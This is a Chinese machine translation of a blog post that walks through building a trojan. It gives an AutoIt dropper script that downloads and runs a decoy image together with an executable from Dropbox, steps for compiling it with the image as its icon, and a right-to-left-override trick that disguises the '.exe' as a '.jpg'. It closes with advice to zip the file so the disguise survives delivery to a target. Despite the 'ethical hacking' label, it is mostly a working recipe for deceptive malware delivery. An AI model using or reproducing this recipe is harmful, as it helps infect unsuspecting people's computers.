<html>
<head>
<title>How I created a Trojan Malware — Ethical Hacking</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何创建一个木马恶意软件——道德黑客</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-created-a-trojan-malware-ethical-hacking-82239a6b64c6?source=collection_archive---------0-----------------------#2022-03-09">https://infosecwriteups.com/how-i-created-a-trojan-malware-ethical-hacking-82239a6b64c6?source=collection_archive---------0-----------------------#2022-03-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><blockquote class="jn jo jp"><p id="2b5e" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><em class="iq">特洛伊木马(或特洛伊木马)是最常见、最危险的威胁类型之一，会感染您的计算机或移动设备。</em></p></blockquote><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi kp"><img src="../Images/9f42d7507b748424306109da5d65e753.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lR2Byi6HLoyxpfln.png"/></div></figure><h1 id="45b1" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">什么是木马恶意软件？</h1><p id="240a" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated"><strong class="jt ir">木马恶意软件</strong>，当打开<strong class="jt ir">时，看起来是用户打开的合法文件</strong>，如打开图片或文档或播放媒体文件，但在<strong class="jt ir">后台，它会运行一些邪恶的进程</strong>，如有人可能通过后门或注入一些其他有害代码来访问您的计算机。</p><h1 id="6d09" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">创建我的木马恶意软件</h1><p id="3e42" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated">在这篇博客中，我将向您展示我如何将我的可执行文件与一个图像文件相结合，当打开时，它能够在目标人员打开它时显示图像，但同时，可执行文件在后台运行。简单地说，我将我的<code class="fe md me mf mg b">.exe</code>文件隐藏在一个<code class="fe md me mf mg b">.jpg</code>图像文件中。</p><p id="b1c5" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">这种方法可以扩展到任何文件类型，比如图像、pdf、音乐等等。大多数情况下，可执行文件是一种病毒或后门程序，用于获取对目标计算机的访问权限。让我们来看看这些步骤:</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/68c571002ba025e8a0e03600af59948b.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/0*cKq_D9bfYBLC5Cr_"/></div></figure><h2 id="730f" class="mi ky iq bd kz mj mk dn ld ml mm dp lh lx mn mo ll lz mp mq lp mb mr ms lt mt bi translated">1.获取图片和<code class="fe md me mf mg b">.exe</code>文件的直接网址</h2><p id="cb1c" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated"><code class="fe md me mf mg b">.exe</code>可执行文件需要出现在一个公开的URL上，浏览器可以从那里直接下载该文件。为此，我已经在dropbox上上传了可执行文件。在dropbox的情况下，将可共享链接的结尾部分修改为<code class="fe md me mf mg b">dl=1</code>，将允许浏览器直接下载文件。我下面分享的链接不包含任何代码，实际上是一个空文件，因此您可以安全地测试该链接的行为。</p><p id="5210" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated"><strong class="jt ir"> URL为</strong> <code class="fe md me mf mg b"><strong class="jt ir">.exe</strong></code> <strong class="jt ir">可执行文件:</strong><a class="ae mu" href="https://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1" rel="noopener ugc nofollow" target="_blank">https://www . Dropbox . com/s/hsnvw 0 ik 1 em 0637/some _ evil _ file . exe？dl=1 </a></p><p id="2d57" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated"><strong class="jt ir">我的图片网址:</strong><a class="ae mu" href="https://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg" rel="noopener ugc nofollow" target="_blank">https://images . adsttc . com/media/images/5b 04/5e3a/f197/cc1f/9600/00aa/newslett/park _ garden _ concourse . jpg</a></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi mv"><img src="../Images/fb95d2f95140ceb1f87d03000f1f99c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PyhjFZ4niwIpv5cvdHl0sA.jpeg"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">体育中心的图像</figcaption></figure><p id="a62e" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">我用体育馆的图片作为封面。</p><h2 id="1131" class="mi ky iq bd kz mj mk dn ld ml mm dp lh lx mn mo ll lz mp mq lp mb mr ms lt mt bi translated">2.在脚本中使用URL</h2><pre class="kq kr ks kt gt ne mg nf ng aw nh bi"><span id="7d0b" class="mi ky iq mg b gy ni nj l nk nl">#include &lt;StaticConstants.au3&gt;<br/>#include &lt;WindowsConstants.au3&gt;</span><span id="7a1e" class="mi ky iq mg b gy nm nj l nk nl">Local $urls = "url1,url2"</span><span id="7d7b" class="mi ky iq mg b gy nm nj l nk nl">Local $urlsArray = StringSplit($urls, ",", 2 )</span><span id="7481" class="mi ky iq mg b gy nm nj l nk nl">For $url In $urlsArray<br/> $sFile = _DownloadFile($url)<br/> shellExecute($sFile)</span><span id="cdb4" class="mi ky iq mg b gy nm nj l nk nl">Next</span><span id="b25a" class="mi ky iq mg b gy nm nj l nk nl">Func _DownloadFile($sURL)<br/>    Local $hDownload, $sFile<br/>    $sFile = StringRegExpReplace($sURL, "^.*/", "")<br/>    $sDirectory = <a class="ae mu" href="http://twitter.com/TempDir" rel="noopener ugc nofollow" target="_blank">@TempDir</a> &amp; $sFile<br/>    $hDownload = InetGet($sURL, $sDirectory, 17, 1)<br/>    InetClose($hDownload)<br/>    Return $sDirectory<br/>EndFunc   ;==&gt;_GetURLImage</span></pre><p id="b99b" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">在上面的代码中，在第3行，用图像的URL替换<code class="fe md me mf mg b">url1</code>,用可执行文件的URL替换<code class="fe md me mf mg b">url2</code>。我的最终代码如下所示</p><pre class="kq kr ks kt gt ne mg nf ng aw nh bi"><span id="e2aa" class="mi ky iq mg b gy ni nj l nk nl">#include &lt;StaticConstants.au3&gt;<br/>#include &lt;WindowsConstants.au3&gt;<br/>Local $urls = "<a class="ae mu" href="https://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg,https://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1" rel="noopener ugc nofollow" target="_blank">https://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg,https://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1</a>"<br/>Local $urlsArray = StringSplit($urls, ",", 2 )<br/>For $url In $urlsArray<br/> $sFile = _DownloadFile($url)<br/> shellExecute($sFile)<br/>Next<br/>Func _DownloadFile($sURL)<br/>    Local $hDownload, $sFile<br/>    $sFile = StringRegExpReplace($sURL, "^.*/", "")<br/>    $sDirectory = <a class="ae mu" href="http://twitter.com/TempDir" rel="noopener ugc nofollow" target="_blank">@TempDir</a> &amp; $sFile<br/>    $hDownload = InetGet($sURL, $sDirectory, 17, 1)<br/>    InetClose($hDownload)<br/>    Return $sDirectory<br/>EndFunc   ;==&gt;_GetURLImage</span></pre><p id="d704" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">用扩展名<code class="fe md me mf mg b">.au3</code>保存文件。我已经将文件命名为<code class="fe md me mf mg b">trojan.au3</code>。</p><h2 id="fc8a" class="mi ky iq bd kz mj mk dn ld ml mm dp lh lx mn mo ll lz mp mq lp mb mr ms lt mt bi translated">3.为文件创建图标</h2><p id="4c9a" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated">由于我使用的是图片作为封面文件，<code class="fe md me mf mg b">Windows</code>通常会将图片的缩略图显示为文件图标，所以我将使用体育综合体图片作为图标，并将其转换为<code class="fe md me mf mg b">.ico</code>格式。你可以谷歌一下，你会发现很多工具可以做到这一点。我用了这个网站-【https://cloudconvert.com/jpg-to-ico T21】</p><h2 id="2178" class="mi ky iq bd kz mj mk dn ld ml mm dp lh lx mn mo ll lz mp mq lp mb mr ms lt mt bi translated">4.编译脚本</h2><p id="1cc5" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated">这个脚本是用一种叫做<code class="fe md me mf mg b">AutoIt</code>的脚本语言编写的。要在Ubuntu中安装<code class="fe md me mf mg b">AutoIt</code>，可以先安装<code class="fe md me mf mg b">wine</code>再安装<code class="fe md me mf mg b">AutoIt</code>，或者如果你想要一个直截了当的方法，从这里提到的步骤开始安装<code class="fe md me mf mg b">Veil</code>https://www.javatpoint.com/installing-veil。<code class="fe md me mf mg b">AutoIt</code>将在其中一个步骤中安装，之后您可以退出安装。</p><p id="ae50" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">打开编译AutoIt应用程序。该窗口应该看起来像下面显示的框。输入<code class="fe md me mf mg b">trojan.au3</code>文件的位置和<code class="fe md me mf mg b">.ico</code>文件的路径。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/04d32ae54220a7ecfcdb5670aca49935.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*5-1dr8f5LzDUJBOJaPvWqg.png"/></div></figure><p id="45bc" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">在windows计算机上，转换后的文件如下所示。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi no"><img src="../Images/2e91519416ddc969a7148a190113e905.png" data-original-src="https://miro.medium.com/v2/resize:fit:1286/format:webp/1*-fU27WNK71eJozcTTx8TIg.png"/></div></figure><p id="250c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">嗯，有点不对劲。这个文件的问题在于它的扩展名。很明显，这是一个可执行文件，因为它的扩展名是<code class="fe md me mf mg b">.exe</code>。我们需要伪造这个扩展。</p><h2 id="25cd" class="mi ky iq bd kz mj mk dn ld ml mm dp lh lx mn mo ll lz mp mq lp mb mr ms lt mt bi translated">5.“欺骗”。“exe”扩展名扩展到任何扩展名</h2><p id="a2ef" class="pw-post-body-paragraph jq jr iq jt b ju lv jw jx jy lw ka kb lx ly ke kf lz ma ki kj mb mc km kn ko ij bi translated">为了欺骗明显的扩展<code class="fe md me mf mg b">.exe</code>并用<code class="fe md me mf mg b">.jpeg</code>替换它，我们将使用一个<code class="fe md me mf mg b">right-to-left-override</code>字符。</p><p id="4803" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">要了解欺骗实际上是如何工作的细节以及在哪里放置<code class="fe md me mf mg b">right-to-left-override</code>字符，请阅读博客。</p><div class="np nq gp gr nr ns"><a href="https://levelup.gitconnected.com/spoofing-file-extensions-ethical-hacking-bd128189738b" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">欺骗文件扩展名—道德黑客</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">创建特洛伊木马时，文件扩展名欺骗是一个方便的技巧。我会恶搞的。“exe”扩展为。jpg'…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">levelup.gitconnected.com</p></div></div><div class="ob l"><div class="oc l od oe of ob og kv ns"/></div></div></a></div><p id="78d7" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">总结一下上面博客中提到的步骤:</p><ul class=""><li id="89bf" class="oh oi iq jt b ju jv jy jz lx oj lz ok mb ol ko om on oo op bi translated">将<code class="fe md me mf mg b">trojan.exe</code>重命名为<code class="fe md me mf mg b">trojangpj.exe</code>。</li><li id="425c" class="oh oi iq jt b ju oq jy or lx os lz ot mb ou ko om on oo op bi translated">在木马后的第7位粘贴<code class="fe md me mf mg b">right-to-left-override</code>字符。在<code class="fe md me mf mg b">right-to-left-override</code>字符之后的所有字符将被翻转，即从右向左阅读。</li></ul><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/851284654892e60e6b6080657345c5b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:756/format:webp/1*OsbEGOaAEhDQL2zFKCTKIg.png"/></div></figure><p id="2f94" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">文件名现在看起来像<code class="fe md me mf mg b">trojanexe.jpg</code></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="mw mx di my bf mz"><div class="gh gi kp"><img src="../Images/cf50e5ac926643965accc0baeed11861.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*27Hatn9jxr6N49ujh8Ww3A.png"/></div></div></figure><p id="adc8" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">由于文件中包含的图像是一个体育中心，我将用<code class="fe md me mf mg b">sportscompl_</code>替换名称中的<code class="fe md me mf mg b">trojan</code>，这样文件名就变成了<code class="fe md me mf mg b">sports_complexe.jpg</code>。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/3c91070de3819a06d7b0705ad8e7821a.png" data-original-src="https://miro.medium.com/v2/resize:fit:876/format:webp/1*AaT5o1PoKq9IUPymzlDiQQ.png"/></div></figure><p id="ec2b" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated"><strong class="jt ir">祝贺你！！！木马准备好了。</strong></p><p id="e90c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lx kd ke kf lz kh ki kj mb kl km kn ko ij bi translated">现在，文件名与包含的图像相匹配。一些最新的浏览器在下载前取消了从右到左的覆盖。所以压缩文件并发送过来是个好主意。</p></div><div class="ab cl ox oy hu oz" role="separator"><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc"/></div><div class="ij ik il im in"><blockquote class="jn jo jp"><p id="5019" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">这是一份探索我们博客平台<a class="ae mu" href="https://www.thegeekyminds.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jt ir">极客头脑</strong> </a>的邀请。一个让您了解软件开发和技术领域最新发展的一站式平台。我们在<a class="ae mu" href="https://www.thegeekyminds.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jt ir">的极客头脑</strong> </a> <strong class="jt ir"> </strong>旨在写一些你实际上可以用来提高工作效率和充实你的职业生活的内容。</p><p id="7a2b" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">邀请您在<a class="ae mu" href="https://thegeekyminds.com/" rel="noopener ugc nofollow" target="_blank"><strong class="jt ir">https://thegeekyminds.com</strong></a>通过我们的平台。并订阅我们的时事通讯，以便在我们每次发布新帖子时收到电子邮件。我们承诺不会向您的收件箱发送垃圾邮件。点击下面的按钮订阅我们的时事通讯</p></blockquote><figure class="kq kr ks kt gt ku gh gi paragraph-image"><a href="https://forms.wix.com/4444cf13-7653-460d-9b32-f2e4e65544d1:c2184260-1ab5-4c6a-a37d-53de0778afa0"><div class="gh gi pe"><img src="../Images/eec8beec45924704f52b518aeb1a3e7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:380/format:webp/0*1mou_RO9R61sgZPt.jpeg"/></div></a></figure></div></div>    
</body>
</html>